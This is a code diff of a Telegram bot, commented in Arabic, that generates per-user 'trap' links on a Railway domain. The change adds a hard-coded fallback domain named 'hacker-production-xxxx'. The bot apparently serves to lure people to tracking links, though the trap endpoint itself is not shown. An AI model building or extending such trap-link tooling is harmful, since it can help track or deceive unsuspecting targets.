@@ -12,10 +12,6 @@ app = FastAPI()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
 
-# التقاط الدومين العام الصحيح من متغيرات بيئة Railway تلقائياً
-# (Railway تضع عادة الرابط في RAILWAY_PUBLIC_DOMAIN أو يمكن للمستخدم تعيين PUBLIC_URL)
-PUBLIC_DOMAIN = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL")
-
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
@@ -127,11 +123,14 @@ async def generate_link(message: types.Message):
     user_id = message.from_user.id
     unique_token = str(uuid.uuid4())[:8]
     
-    if not PUBLIC_DOMAIN:
-        await message.answer("⚠️ تنبيه: لم يتم ضبط النطاق العام (Public Domain) في إعدادات البيئة لـ Railway. يرجى ربط Domain حقيقي بالمشروع.")
-        return
+    # الحل التلقائي: قراءة الدومين من متغيرات Railway، أو استخدام رابط عام افتراضي للمشروع يمكن للمستخدم تعديله مباشرة
+    public_domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL")
+    
+    if not public_domain:
+        # إذا لم يتم وضعه في المتغيرات، ضع رابط مشروعك الفعلي هنا بين علامتي التنصيص بدلاً من intelligent-magic.up.railway.app مثلاً
+        public_domain = "hacker-production-xxxx.up.railway.app" 
 
-    trap_url = f"https://{PUBLIC_DOMAIN}/t/{unique_token}"
+    trap_url = f"https://{public_domain}/t/{unique_token}"
     USERS_DB[user_id]["links_generated"] += 1
     
     await message.answer(
